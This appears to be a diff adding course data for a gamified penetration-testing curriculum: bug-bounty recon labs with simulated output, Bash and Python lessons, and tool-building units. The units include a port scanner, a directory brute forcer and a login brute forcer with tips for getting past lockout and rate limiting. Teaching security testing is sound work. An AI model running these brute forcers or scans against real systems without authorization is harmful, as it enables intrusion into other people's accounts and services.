+            {hint:"Check which subdomains are alive and what they return.",accept:["~httpx","~| httpx","subfinder -d megacorp.com | httpx"],output:"https://www.megacorp.com [200] [MegaCorp - Home]\nhttps://api.megacorp.com [403] [Forbidden]\nhttp://staging.megacorp.com [200] [MegaCorp Staging]\nhttp://dev.megacorp.com [200] [Under Construction]\nhttps://mail.megacorp.com [302] [Redirect]\nhttp://old.megacorp.com [200] [MegaCorp v1]\n\n[!] staging and dev are running HTTP (not HTTPS)!",successMsg:"staging and dev are HTTP-only. old.megacorp.com runs an old version.",example:"subfinder -d megacorp.com | httpx",quickCmds:["subfinder -d megacorp.com | httpx"]},
+            {hint:"The staging site looks juicy. Run a directory scan on it.",accept:["~gobuster","~dirsearch","gobuster dir -u http://staging.megacorp.com -w /usr/share/wordlists/dirb/common.txt"],output:"/admin          [302] -> /admin/login\n/api            [200] Size: 4521\n/backup         [200] Size: 891\n/config         [403]\n/.env           [200] Size: 234\n/.git           [301] -> /.git/\n/uploads        [200]\n\n[!] .env file exposed! .git directory accessible!",successMsg:"Exposed .env file and .git repo on staging!",example:"gobuster dir -u http://staging.megacorp.com -w wordlist.txt",quickCmds:["gobuster dir -u http://staging.megacorp.com -w /usr/share/wordlists/dirb/common.txt"]},
+            {hint:"Read the .env file — it might have secrets.",accept:["curl http://staging.megacorp.com/.env","~.env","~curl staging"],output:"APP_ENV=staging\nDB_HOST=internal-db.megacorp.com\nDB_USER=megacorp_admin\nDB_PASS=Str0ngP@ss2024!\nAWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAPI_SECRET=sk-live-8f3d9a2b5c1e7f4d\n\n[!!!] CRITICAL: Database creds AND AWS keys exposed!",successMsg:"Critical finding! Database password and AWS keys in plaintext!",example:"curl http://staging.megacorp.com/.env",quickCmds:["curl http://staging.megacorp.com/.env"]},
+            {hint:"Document your finding. What severity would you rate exposed AWS keys on a staging server?",accept:["critical","Critical","CRITICAL","~critical"],output:"=== BUG REPORT ===\nTitle: Exposed .env file with AWS keys and DB credentials\nSeverity: CRITICAL\nAsset: staging.megacorp.com\nSteps:\n1. Navigate to http://staging.megacorp.com/.env\n2. Observe plaintext AWS keys and database credentials\nImpact: Full AWS account compromise, database access\nRemediation: Remove .env from web root, rotate all keys\n\n[+] Report submitted! Expected bounty: $5,000-$15,000",successMsg:"Report submitted! That's a real-world critical finding.",example:"critical",quickCmds:["critical","high","medium"]},
+          ]},
+      ]},
+      {id:"u10l5",title:"Mastery Test: Bug Bounty",rounds:[
+        {type:"type",q:"Recon chain: find subdomains, check alive, scan for vulns:",a:["subfinder -d target.com | httpx | nuclei"],why:"The standard automated recon pipeline."},
+        {type:"type",q:"Find historical URLs for a domain:",a:["waybackurls target.com","gau target.com"],why:"Historical URLs reveal forgotten endpoints."},
+        {type:"order",q:"Bug bounty workflow:",items:["Read scope","Enumerate subdomains","Map application","Test for vulnerabilities","Write report"],why:"Methodology prevents missed findings."},
+        {type:"type",q:"Name a major bug bounty platform:",a:["hackerone","HackerOne","bugcrowd","Bugcrowd","intigriti","Intigriti","synack"],why:"These platforms connect researchers with programs."},
+        {type:"type",q:"What makes a report get accepted and paid?",a:["clear steps to reproduce","steps to reproduce","reproducible steps","clear reproduction steps"],why:"If they can't reproduce it, they won't pay."},
+        {type:"tf",q:"You should always chain bugs when possible to demonstrate maximum impact.",a:true,why:"Chains demonstrate real-world attack scenarios and earn higher bounties."}
+      ]}
+    ]
+  }
+];
+
+// UNITS 11-14: Bash Scripting, Python Core, Python Intermediate, Python Hacking Tools
+const UNITS_11_14 = [
+  {
+    id:"u11", title:"Bash Scripting", desc:"Automate tasks, write scripts, build tools",
+    levels:[
+      {id:"u11l1",title:"Variables & Echo",rounds:[
+        {type:"teach",text:"Bash scripts start with #!/bin/bash (shebang line). Variables: name='kali' (NO spaces around =). Access with $: echo $name. Read user input: read -p 'Enter IP: ' target. Run script: chmod +x script.sh && ./script.sh"},
+        {type:"type",q:"Create a variable called ip with value 10.10.10.5:",a:["ip='10.10.10.5'","ip=\"10.10.10.5\"","ip=10.10.10.5"],why:"No spaces around = in bash variable assignment."},
+        {type:"teach",text:"echo prints output. echo $variable prints the value. Command substitution: result=$(nmap -sn 10.10.10.0/24) captures output in a variable. Arguments: $1 = first arg, $2 = second, $# = count, $@ = all args."},
+        {type:"type",q:"Store the output of 'whoami' in a variable called user:",a:["user=$(whoami)","user=`whoami`"],why:"$() captures command output."},
+        {type:"pick",q:"In a script, $1 refers to:",opts:["First command line argument","The number 1","The process ID","The exit code"],a:"First command line argument",why:"$1-$9 are positional parameters."}
+      ]},
+      {id:"u11l2",title:"Conditionals & Loops",rounds:[
+        {type:"teach",text:"If statements: if [ $x -eq 5 ]; then echo 'five'; fi. Comparisons: -eq (equal), -ne (not equal), -gt (greater), -lt (less), -f (file exists), -d (dir exists), -z (string empty)."},
+        {type:"pick",q:"Which tests if a file exists?",opts:["-f","-eq","-z","-gt"],a:"-f",why:"-f tests file existence."},
+        {type:"teach",text:"For loops: for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; done. While: while read line; do echo $line; done < file.txt reads a file line by line."},
+        {type:"type",q:"Write a for loop pinging 192.168.1.1 through 192.168.1.254:",a:["for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; done","for i in {1..254}; do ping -c 1 192.168.1.$i; done"],why:"seq or brace expansion generates number ranges."},
+        {type:"build",q:"Build: if port equals 80, print 'web server':",parts:["if","[ $port -eq 80 ];","then","echo 'web server';","fi"],answer:["if","[ $port -eq 80 ];","then","echo 'web server';","fi"],why:"Bash if: if [ condition ]; then action; fi"}
+      ]},
+      {id:"u11l3",title:"Pipes & Text Processing",rounds:[
+        {type:"teach",text:"Pipes chain commands. cat access.log | grep '404' | awk '{print $1}' | sort | uniq -c | sort -rn finds which IPs got the most 404s. sed for find/replace: sed -i 's/http/https/g' file. tr translates: echo 'HELLO' | tr 'A-Z' 'a-z'."},
+        {type:"build",q:"Build: extract IPs from access.log that got 200 responses, count unique ones:",parts:["cat access.log","|","grep '200'","|","awk '{print $1}'","|","sort","|","uniq -c"],answer:["cat access.log","|","grep '200'","|","awk '{print $1}'","|","sort","|","uniq -c"],why:"Filter, extract, sort, count."},
+        {type:"teach",text:"xargs passes input as arguments: cat ips.txt | xargs -I {} nmap {} runs nmap on every IP. tee copies output to screen AND file: nmap 10.10.10.5 | tee scan.txt."},
+        {type:"type",q:"Run nmap on every IP in targets.txt:",a:["cat targets.txt | xargs -I {} nmap {}","xargs -I {} nmap {} < targets.txt"],why:"xargs feeds each line as an argument."}
+      ]},
+      {id:"u11l4",title:"Building Real Scripts",rounds:[
+        {type:"teach",text:"Ping sweeper: #!/bin/bash\\nfor ip in $(seq 1 254); do ping -c 1 -W 1 $1.$ip | grep 'bytes from' | cut -d' ' -f4 | tr -d ':' & done; wait. The & runs pings in parallel, wait waits for all."},
+        {type:"teach",text:"Port scanner using /dev/tcp: for port in $(seq 1 1000); do (echo > /dev/tcp/$1/$port) 2>/dev/null && echo 'Port $port open'; done. /dev/tcp is a bash built-in for TCP connections."},
+        {type:"pick",q:"What does /dev/tcp/HOST/PORT do in bash?",opts:["Opens a TCP connection","Reads a file","Scans UDP","Sends email"],a:"Opens a TCP connection",why:"Bash special file for TCP connections."},
+        {type:"teach",text:"Functions: function scan() { nmap -sV $1 -oA $2; } called with: scan 10.10.10.5 results. Arrays: ports=(22 80 443 8080); for p in ${ports[@]}; do echo $p; done."},
+        {type:"type",q:"Write a bash function called recon that runs nmap:",a:["function recon() { nmap $1; }","recon() { nmap $1; }"],why:"Functions group reusable commands."}
+      ]},
+      {id:"u11l5",title:"Mastery Test: Bash",rounds:[
+        {type:"type",q:"Store command output in a variable:",a:["var=$(command)","result=$(whoami)"],why:"$() is command substitution."},
+        {type:"type",q:"Check if file exists in bash:",a:["[ -f file ]","if [ -f file ]; then","test -f file"],why:"-f tests file existence."},
+        {type:"type",q:"Loop through IPs 1-254:",a:["for ip in $(seq 1 254); do","for i in {1..254}; do"],why:"seq generates sequences."},
+        {type:"type",q:"Read a file line by line:",a:["while read line; do echo $line; done < file.txt","while IFS= read -r line; do echo \"$line\"; done < file.txt"],why:"while read processes lines."},
+        {type:"type",q:"First line of every bash script:",a:["#!/bin/bash","#!/usr/bin/env bash"],why:"Shebang tells the system which interpreter to use."},
+        {type:"type",q:"What bash path opens a TCP connection?",a:["/dev/tcp","/dev/tcp/host/port"],why:"Bash built-in TCP connector."}
+      ]}
+    ]
+  },
+  {
+    id:"u12", title:"Python: Core", desc:"Variables, strings, data structures, control flow, functions",
+    levels:[
+      {id:"u12l1",title:"Variables & Types",rounds:[
+        {type:"teach",text:"Python variables need no type declaration. name = 'kali' (string), port = 80 (int), alive = True (bool), score = 9.5 (float). type(port) shows the type. Python uses indentation instead of braces."},
+        {type:"type",q:"Create a variable target with value '10.10.10.5':",a:["target = '10.10.10.5'","target='10.10.10.5'","target = \"10.10.10.5\""],why:"Strings use single or double quotes."},
+        {type:"teach",text:"f-strings: print(f'Scanning {target} on port {port}'). input() gets user input: ip = input('Enter IP: '). int() converts to integer. sys.argv for CLI args: import sys; target = sys.argv[1]."},
+        {type:"type",q:"Print 'Target: ' followed by variable target using f-string:",a:["print(f'Target: {target}')","print(f\"Target: {target}\")"],why:"f-strings embed variables with {}."},
+        {type:"type",q:"Get the first command line argument:",a:["sys.argv[1]","import sys; sys.argv[1]"],why:"sys.argv[1] is the first CLI argument."}
+      ]},
+      {id:"u12l2",title:"Strings & Methods",rounds:[
+        {type:"teach",text:"String methods: .split(':') splits on colon. .strip() removes whitespace. .replace('old','new') replaces. .startswith()/.endswith() check prefixes. .lower()/.upper() change case. 'x' in s checks membership."},
+        {type:"type",q:"Split '192.168.1.1:8080' on ':':",a:["'192.168.1.1:8080'.split(':')","s.split(':')"],why:".split(':') returns ['192.168.1.1', '8080']."},
+        {type:"teach",text:"Slicing: s[0] first char, s[-1] last, s[0:5] first 5, s[::-1] reversed. len(s) length. .join() combines: ':'.join(['a','b','c']) is 'a:b:c'. .count('x') counts occurrences."},
+        {type:"type",q:"Join a list of IPs with newlines:",a:["'\\n'.join(ip_list)","'\\n'.join(ips)"],why:".join() concatenates with separator."},
+        {type:"pick",q:"What does 'hello'[::-1] return?",opts:["'olleh'","'hello'","'h'","Error"],a:"'olleh'",why:"[::-1] reverses the string."}
+      ]},
+      {id:"u12l3",title:"Lists & Dictionaries",rounds:[
+        {type:"teach",text:"Lists: ordered, mutable. ports = [22, 80, 443]. .append(8080) adds. .remove(80) removes. ports[0] accesses. len(ports) counts. 80 in ports checks. .sort() sorts."},
+        {type:"type",q:"Add port 3306 to list ports:",a:["ports.append(3306)"],why:".append() adds to end of list."},
+        {type:"teach",text:"Dictionaries: key-value pairs. target = {'ip': '10.10.10.5', 'os': 'Linux'}. target['ip'] accesses. target['hostname'] = 'web01' adds. .keys(), .values(), .items() iterate. .get('key', 'default') avoids KeyError."},
+        {type:"type",q:"Get 'ip' from dict target:",a:["target['ip']","target.get('ip')"],why:"Square brackets or .get() access values."},
+        {type:"teach",text:"List comprehensions: [p for p in range(1,1001) if is_open(p)] creates filtered list in one line. Very Pythonic."},
+        {type:"type",q:"List of even numbers 1-100 using comprehension:",a:["[x for x in range(1,101) if x % 2 == 0]","[i for i in range(2,101,2)]"],why:"Comprehensions filter and transform in one line."}
+      ]},
+      {id:"u12l4",title:"Conditionals & Loops",rounds:[
+        {type:"teach",text:"If/elif/else: if port == 22: print('SSH') elif port == 80: print('HTTP') else: print('Unknown'). Comparisons: ==, !=, <, >, <=, >=. Logic: and, or, not."},
+        {type:"type",q:"Write an if statement: if port is 443 print 'HTTPS':",a:["if port == 443: print('HTTPS')","if port == 443:\\n    print('HTTPS')"],why:"== for comparison, single = is assignment."},
+        {type:"teach",text:"For loops: for port in [22,80,443]: print(port). for i in range(1,255): scans IPs 1-254. While: while attempts < 3: try_login(). break exits loop. continue skips iteration. enumerate() gives index: for i, port in enumerate(ports)."},
+        {type:"type",q:"Loop through ports 1-1024:",a:["for port in range(1, 1025):","for p in range(1,1025):"],why:"range(1,1025) generates 1 through 1024."},
+        {type:"pick",q:"What does enumerate() give you?",opts:["Index and value","Just the index","Just the value","A dictionary"],a:"Index and value",why:"for i, item in enumerate(list) gives both."}
+      ]},
+      {id:"u12l5",title:"Functions & Lambda",rounds:[
+        {type:"teach",text:"Functions: def scan(target, port=80): return f'{target}:{port}'. Default args, return values. *args for variable positional args. **kwargs for keyword args. Lambda: short inline functions: is_open = lambda p: p in open_ports."},
+        {type:"type",q:"Define a function scan that takes target and returns it uppercase:",a:["def scan(target): return target.upper()","def scan(target):\\n    return target.upper()"],why:"def name(params): return value"},
+        {type:"teach",text:"map() applies a function to every item: list(map(int, ['22','80','443'])) gives [22,80,443]. filter() keeps items that pass a test: list(filter(lambda p: p < 1024, ports)). Both return iterators so wrap in list()."},
+        {type:"type",q:"Convert a list of string ports to integers:",a:["list(map(int, port_strings))","[int(p) for p in port_strings]"],why:"map(int, list) applies int() to each item."},
+        {type:"pick",q:"What does lambda x: x*2 do?",opts:["Returns x doubled","Defines a named function","Creates a list","Raises an error"],a:"Returns x doubled",why:"Lambda creates anonymous inline functions."}
+      ]},
+      {id:"u12l6",title:"Mastery Test: Python Core",rounds:[
+        {type:"type",q:"Print variable ip using an f-string:",a:["print(f'{ip}')","print(f\"{ip}\")","print(f'IP: {ip}')"],why:"f-strings embed variables."},
+        {type:"type",q:"Split '10.10.10.5:22' into IP and port:",a:["'10.10.10.5:22'.split(':')","s.split(':')"],why:".split() divides strings."},
+        {type:"type",q:"Add item to end of a list:",a:["list.append(item)","ports.append(22)","my_list.append(x)"],why:".append() adds to list end."},
+        {type:"type",q:"Access key 'ip' in dictionary:",a:["d['ip']","target['ip']","data.get('ip')"],why:"Square brackets or .get() for dict access."},
+        {type:"type",q:"Loop through numbers 1 to 100:",a:["for i in range(1, 101):","for x in range(1,101):"],why:"range(1,101) generates 1-100."},
+        {type:"type",q:"Define a function that takes 2 args and returns their sum:",a:["def add(a, b): return a + b","def add(x, y): return x + y"],why:"def name(params): return value."}
+      ]}
+    ]
+  },
+  {
+    id:"u13", title:"Python: Intermediate", desc:"File I/O, error handling, regex, JSON, OS commands",
+    levels:[
+      {id:"u13l1",title:"File I/O",rounds:[
+        {type:"teach",text:"Read files: with open('file.txt','r') as f: data = f.read(). .readlines() returns a list of lines. Write: with open('out.txt','w') as f: f.write('data'). Append: mode 'a'. 'with' auto-closes the file."},
+        {type:"type",q:"Read all lines from targets.txt into a list:",a:["with open('targets.txt') as f: lines = f.readlines()","open('targets.txt').readlines()","lines = open('targets.txt','r').readlines()"],why:".readlines() returns list of lines."},
+        {type:"type",q:"Write 'PWNED' to a file called results.txt:",a:["with open('results.txt','w') as f: f.write('PWNED')","open('results.txt','w').write('PWNED')"],why:"'w' mode creates/overwrites the file."},
+        {type:"teach",text:"CSV files: import csv; reader = csv.reader(open('data.csv')). DictReader gives dicts: for row in csv.DictReader(open('data.csv')): print(row['name']). Writer: csv.writer(f).writerow(['col1','col2'])."},
+        {type:"pick",q:"What does mode 'a' do when opening a file?",opts:["Appends without overwriting","Always overwrites","Opens read-only","Creates binary"],a:"Appends without overwriting",why:"'a' adds to the end of existing content."}
+      ]},
+      {id:"u13l2",title:"Error Handling",rounds:[
+        {type:"teach",text:"try/except catches errors: try: conn = connect(ip) except ConnectionError: print('Failed'). Multiple except blocks: except TimeoutError: ... except Exception as e: print(e). finally: runs always (cleanup). raise Exception('custom error') throws errors."},
+        {type:"type",q:"Wrap a connection in try/except:",a:["try:\\n    connect(ip)\\nexcept Exception as e:\\n    print(e)","try: connect(ip)\\nexcept: print('failed')"],why:"try/except prevents crashes from errors."},
+        {type:"teach",text:"Common exceptions: ConnectionRefusedError (port closed), TimeoutError (no response), FileNotFoundError (missing file), KeyError (missing dict key), IndexError (list out of range), ValueError (wrong type conversion)."},
+        {type:"pick",q:"What exception means a port is closed?",opts:["ConnectionRefusedError","TimeoutError","FileNotFoundError","KeyError"],a:"ConnectionRefusedError",why:"Connection refused = the port actively rejected the connection."},
+        {type:"type",q:"Raise a custom error with message 'Invalid target':",a:["raise Exception('Invalid target')","raise ValueError('Invalid target')"],why:"raise throws an exception."}
+      ]},
+      {id:"u13l3",title:"Regex",rounds:[
+        {type:"teach",text:"import re. re.findall(pattern, text) finds all matches. re.search(pattern, text) finds first match. Patterns: \\d (digit), \\w (word char), . (any char), + (1 or more), * (0 or more), [] (character class), () (capture group)."},
+        {type:"teach",text:"IP regex: r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' matches IPs. Email: r'[\\w.-]+@[\\w.-]+'. URL: r'https?://[\\S]+'. re.sub() replaces: re.sub(r'\\d+', 'X', text) replaces all numbers with X."},
+        {type:"type",q:"Find all IP addresses in a text string:",a:["re.findall(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', text)","re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', text)"],why:"\\d{1,3} matches 1-3 digits, \\. matches literal dot."},
+        {type:"type",q:"Find all email addresses in text:",a:["re.findall(r'[\\w.-]+@[\\w.-]+', text)","re.findall(r'\\S+@\\S+', text)"],why:"[\\w.-]+ matches word chars, dots, hyphens before and after @."},
+        {type:"pick",q:"What does \\d+ match?",opts:["One or more digits","One digit only","Any character","A word"],a:"One or more digits",why:"\\d = digit, + = one or more."}
+      ]},
+      {id:"u13l4",title:"JSON & OS Commands",rounds:[
+        {type:"teach",text:"JSON: import json. Parse: data = json.loads(json_string). Read file: data = json.load(open('data.json')). Create: json.dumps(dict_data, indent=2). Write: json.dump(data, open('out.json','w'), indent=2)."},
+        {type:"type",q:"Parse a JSON string into a Python dict:",a:["json.loads(json_string)","data = json.loads(s)","import json; json.loads(text)"],why:".loads() parses JSON string to dict."},
+        {type:"teach",text:"Run OS commands: import subprocess. result = subprocess.run(['nmap','-sV','10.10.10.5'], capture_output=True, text=True). result.stdout has output. os.system('command') runs but gives less control. import os; os.listdir('.') lists files."},
+        {type:"type",q:"Run 'whoami' and capture the output in Python:",a:["subprocess.run(['whoami'], capture_output=True, text=True).stdout","import subprocess; subprocess.run(['whoami'], capture_output=True, text=True)","os.popen('whoami').read()"],why:"subprocess.run with capture_output captures stdout."},
+        {type:"pick",q:"Which gives you more control over command execution?",opts:["subprocess.run","os.system","print()","input()"],a:"subprocess.run",why:"subprocess.run captures output, errors, return codes — os.system just runs."}
+      ]},
+      {id:"u13l5",title:"Mastery Test: Python Intermediate",rounds:[
+        {type:"type",q:"Read all lines from a file:",a:["open('file.txt').readlines()","with open('file.txt') as f: f.readlines()"],why:".readlines() returns list of lines."},
+        {type:"type",q:"Catch any error and print the message:",a:["except Exception as e: print(e)","try: code()\\nexcept Exception as e: print(e)"],why:"Exception catches all error types."},
+        {type:"type",q:"Find all IP addresses in text using regex:",a:["re.findall(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', text)","re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', text)"],why:"Regex pattern matches IP format."},
+        {type:"type",q:"Parse JSON string to Python dict:",a:["json.loads(s)","json.loads(json_string)"],why:".loads() for strings, .load() for files."},
+        {type:"type",q:"Run a system command and capture output:",a:["subprocess.run(['cmd'], capture_output=True, text=True)","subprocess.run(['whoami'], capture_output=True, text=True).stdout"],why:"subprocess.run with capture_output."},
+        {type:"type",q:"Write a dict to a JSON file with indentation:",a:["json.dump(data, open('out.json','w'), indent=2)","with open('out.json','w') as f: json.dump(data, f, indent=2)"],why:".dump() writes to file, indent=2 for readability."}
+      ]}
+    ]
+  },
+  {
+    id:"u14", title:"Python: Hacking Tools", desc:"Sockets, HTTP, threading, build real tools",
+    levels:[
+      {id:"u14l1",title:"Socket Programming",rounds:[
+        {type:"teach",text:"Sockets = raw network connections. import socket. Create: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM). Connect: s.connect(('10.10.10.5', 80)). Send: s.send(b'GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n'). Receive: data = s.recv(4096). Close: s.close()."},
+        {type:"type",q:"Create a TCP socket and connect to 10.10.10.5 port 80:",a:["s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('10.10.10.5', 80))","s = socket.socket(); s.connect(('10.10.10.5', 80))"],why:"AF_INET = IPv4, SOCK_STREAM = TCP."},
+        {type:"teach",text:"Port check with sockets: s.settimeout(1); result = s.connect_ex(('ip', port)). connect_ex returns 0 if port is open, nonzero if closed. This is the foundation of every port scanner."},
+        {type:"type",q:"Check if port 22 is open using connect_ex:",a:["s.connect_ex(('10.10.10.5', 22))","result = s.connect_ex((target, 22))"],why:"connect_ex returns 0 = open, nonzero = closed."},
+        {type:"teach",text:"Banner grabbing: connect to a port, receive data — many services send a banner. s.connect(('ip', 22)); banner = s.recv(1024); print(banner.decode()). SSH might respond: SSH-2.0-OpenSSH_7.6."},
+        {type:"type",q:"Grab the banner from port 22:",a:["s.connect(('10.10.10.5', 22)); s.recv(1024)","banner = s.recv(1024).decode()"],why:"Many services send identification banners on connect."}
+      ]},
+      {id:"u14l2",title:"HTTP with Requests",rounds:[
+        {type:"teach",text:"import requests. GET: r = requests.get('http://target'). POST: r = requests.post(url, data={'user':'admin','pass':'test'}). r.status_code (200, 404, etc), r.text (body), r.headers, r.cookies, r.json() (parse JSON response)."},
+        {type:"type",q:"Send a GET request and print the status code:",a:["r = requests.get(url); print(r.status_code)","requests.get('http://target').status_code"],why:".status_code returns the HTTP response code."},
+        {type:"teach",text:"Sessions persist cookies: s = requests.Session(). s.post(login_url, data=creds) logs in, then s.get(protected_page) keeps the session. Custom headers: requests.get(url, headers={'User-Agent':'Mozilla/5.0'}). Proxying through Burp: proxies={'http':'http://127.0.0.1:8080'}."},
+        {type:"type",q:"Create a session and POST login credentials:",a:["s = requests.Session(); s.post(url, data={'user':'admin','pass':'test'})","session = requests.Session(); session.post(login_url, data=creds)"],why:"Sessions persist cookies across requests."},
+        {type:"pick",q:"Why use requests.Session()?",opts:["Cookies persist between requests","Faster connections","Encrypts traffic","Avoids detection"],a:"Cookies persist between requests",why:"Session objects maintain cookies, auth, and headers across multiple requests."}
+      ]},
+      {id:"u14l3",title:"Threading & Speed",rounds:[
+        {type:"teach",text:"Threading runs code in parallel. from concurrent.futures import ThreadPoolExecutor. with ThreadPoolExecutor(max_workers=50) as ex: ex.map(scan_port, range(1,1001)). This scans 50 ports at once instead of one at a time."},
+        {type:"type",q:"Scan ports 1-1000 using 50 threads:",a:["with ThreadPoolExecutor(max_workers=50) as ex: ex.map(scan, range(1,1001))","ThreadPoolExecutor(50).map(scan_port, range(1,1001))"],why:"ThreadPoolExecutor runs multiple port checks simultaneously."},
+        {type:"teach",text:"Basic threading: import threading. t = threading.Thread(target=scan, args=(ip,)). t.start(). t.join() waits for completion. For simple parallelism ThreadPoolExecutor is easier, but raw threads give more control."},
+        {type:"pick",q:"What does max_workers=50 mean?",opts:["50 threads running at once","50 ports to scan","50 second timeout","50 retries"],a:"50 threads running at once",why:"max_workers sets the thread pool size — how many tasks run in parallel."}
+      ]},
+      {id:"u14l4",title:"Build: Port Scanner",rounds:[
+        {type:"teach",text:"Full port scanner combining everything:\nimport socket\nfrom concurrent.futures import ThreadPoolExecutor\ndef scan(port):\n    s = socket.socket()\n    s.settimeout(1)\n    if s.connect_ex((target,port)) == 0:\n        print(f'Port {port} open')\n    s.close()\nwith ThreadPoolExecutor(100) as ex:\n    ex.map(scan, range(1,65536))"},
+        {type:"order",q:"Order the port scanner logic:",items:["Create socket","Set timeout","Try connect_ex","Check if result is 0 (open)","Print open port","Close socket"],why:"Create → configure → connect → check → report → cleanup."},
+        {type:"type",q:"Set a 1-second timeout on a socket:",a:["s.settimeout(1)","socket.settimeout(1)"],why:"Without timeout, closed ports hang for minutes."},
+        {type:"tf",q:"connect_ex returning 0 means the port is open.",a:true,why:"0 = success = the connection was established = port is open."}
+      ]},
+      {id:"u14l5",title:"Build: Directory Brute Forcer",rounds:[
+        {type:"teach",text:"Dir brute forcer: read wordlist, try each path, check if status code is 200/301/302/403 (exists) vs 404 (not found).\nimport requests\nwith open('wordlist.txt') as f:\n    for word in f:\n        url = f'http://target/{word.strip()}'\n        r = requests.get(url)\n        if r.status_code != 404:\n            print(f'{r.status_code}: {url}')"},
+        {type:"pick",q:"Which status codes indicate a path exists?",opts:["200, 301, 403","404, 500","Only 200","Only 301"],a:"200, 301, 403",why:"200=found, 301=redirect(exists), 403=forbidden(exists but no access). 404=doesn't exist."},
+        {type:"type",q:"Check if a URL returns a non-404 response:",a:["if r.status_code != 404:","if requests.get(url).status_code != 404:"],why:"Anything other than 404 means the path exists."},
+        {type:"teach",text:"Improvements: add threading for speed, custom User-Agent to avoid blocks, filter by response size (some sites return custom 404s with 200 status), add extensions (.php, .html, .bak)."}
+      ]},
+      {id:"u14l6",title:"Build: Login Brute Forcer",rounds:[
+        {type:"teach",text:"Login brute forcer: send POST requests with each password from a wordlist.\ns = requests.Session()\nfor pw in open('passwords.txt'):\n    r = s.post(url, data={'user':'admin','pass':pw.strip()})\n    if 'Invalid' not in r.text:\n        print(f'Found: {pw.strip()}')\n        break"},
+        {type:"order",q:"Order the brute force logic:",items:["Create session","Open password wordlist","Loop through each password","Send POST with credentials","Check response for success/failure","Print if found and break"],why:"Session maintains cookies, wordlist feeds passwords, check response text."},
+        {type:"teach",text:"Anti-brute-force defenses: rate limiting, account lockout, CAPTCHA, IP banning. Bypasses: slow down requests (time.sleep), rotate User-Agents, use proxies, check for CSRF tokens in forms."},
+        {type:"tf",q:"Using requests.Session() is important for brute forcing because it maintains cookies and CSRF tokens.",a:true,why:"Many login forms require cookies/CSRF tokens — Session() handles this automatically."}
+      ]},
+      {id:"u14l7",title:"Power Libraries",rounds:[
+        {type:"teach",text:"Key libraries: scapy (craft raw packets, sniff traffic), beautifulsoup4 (parse HTML), paramiko (SSH connections in Python), pwntools (CTF/exploit development), impacket (Windows protocol attacks — SMB, NTLM, Kerberos)."},
+        {type:"match",q:"Match libraries to their purpose:",pairs:[["scapy","Craft packets & sniff traffic"],["beautifulsoup4","Parse HTML pages"],["paramiko","SSH connections"],["impacket","Windows protocol attacks"]],why:"Each library specializes in different aspects of security testing."},
+        {type:"teach",text:"BeautifulSoup for scraping: from bs4 import BeautifulSoup; soup = BeautifulSoup(html, 'html.parser'). Find links: soup.find_all('a'). Find forms: soup.find_all('form'). Extract: tag['href'], tag.text."},
+        {type:"type",q:"Parse HTML and find all links:",a:["soup.find_all('a')","BeautifulSoup(html,'html.parser').find_all('a')"],why:".find_all('a') returns all anchor (link) tags."},
+        {type:"teach",text:"Install libraries: pip install scapy beautifulsoup4 paramiko requests pwntools. These are your toolkit. Combined with everything you learned — sockets, threading, regex, file I/O — you can build any security tool from scratch."}
+      ]},
+      {id:"u14lab",title:"LAB: Build a Scanner",rounds:[
+        {type:"lab",title:"Python Port Scanner",objective:"Write and run a Python port scanner to scan a target server.",
+          banner:"=== Python Tool Building Lab ===\nTarget: 10.10.10.50\nTask: Build a port scanner in Python\nYour Python3 environment is ready.\n",
+          steps:[
+            {hint:"First, import the socket module.",accept:["import socket","~import socket"],output:">>> import socket\n[+] Socket module loaded.",successMsg:"Socket imported! This handles network connections.",example:"import socket",quickCmds:["import socket"]},
+            {hint:"Create a socket and set a 1-second timeout.",accept:["~settimeout","~socket.socket","s = socket.socket(); s.settimeout(1)"],output:">>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n>>> s.settimeout(1)\n[+] TCP socket created with 1s timeout.",successMsg:"Socket ready! settimeout prevents hanging on closed ports.",example:"s = socket.socket(); s.settimeout(1)",quickCmds:["s = socket.socket(); s.settimeout(1)"]},
+            {hint:"Test if port 22 is open using connect_ex (returns 0 if open).",accept:["~connect_ex","s.connect_ex(('10.10.10.50', 22))"],output:">>> result = s.connect_ex(('10.10.10.50', 22))\n>>> print(result)\n0\n\n[+] Port 22 is OPEN! (result = 0 means success)",successMsg:"Port 22 is open! connect_ex returns 0 for open ports.",example:"s.connect_ex(('10.10.10.50', 22))",quickCmds:["s.connect_ex(('10.10.10.50', 22))"]},
+            {hint:"Now write a loop to scan ports 1-100 and print open ones.",accept:["~for port in range","~for p in range","~range(1"],output:">>> for port in range(1, 101):\n...     s = socket.socket()\n...     s.settimeout(0.5)\n...     if s.connect_ex(('10.10.10.50', port)) == 0:\n...         print(f'Port {port} open')\n...     s.close()\n\nPort 22 open\nPort 53 open\nPort 80 open\n\n[+] 3 open ports found in range 1-100!",successMsg:"Your scanner works! Found SSH, DNS, and HTTP.",example:"for port in range(1, 101):",quickCmds:["for port in range(1, 101):"]},
+            {hint:"Make it faster with ThreadPoolExecutor — scan all 1000 ports in parallel.",accept:["~ThreadPoolExecutor","~concurrent.futures","~threading"],output:">>> from concurrent.futures import ThreadPoolExecutor\n>>> def scan(port):\n...     s = socket.socket()\n...     s.settimeout(0.5)\n...     if s.connect_ex(('10.10.10.50', port)) == 0:\n...         print(f'Port {port} open')\n...     s.close()\n>>> with ThreadPoolExecutor(100) as ex:\n...     ex.map(scan, range(1, 1001))\n\nPort 22 open\nPort 53 open\nPort 80 open\nPort 443 open\nPort 445 open\nPort 993 open\n\n[+] Scan complete in 2.1 seconds! (vs ~8 min without threading)\n[+] You just built a real port scanner!",successMsg:"Your threaded scanner is 200x faster! Real hacking tool built.",example:"ThreadPoolExecutor(100)",quickCmds:["from concurrent.futures import ThreadPoolExecutor"]},
+          ]},
+      ]},
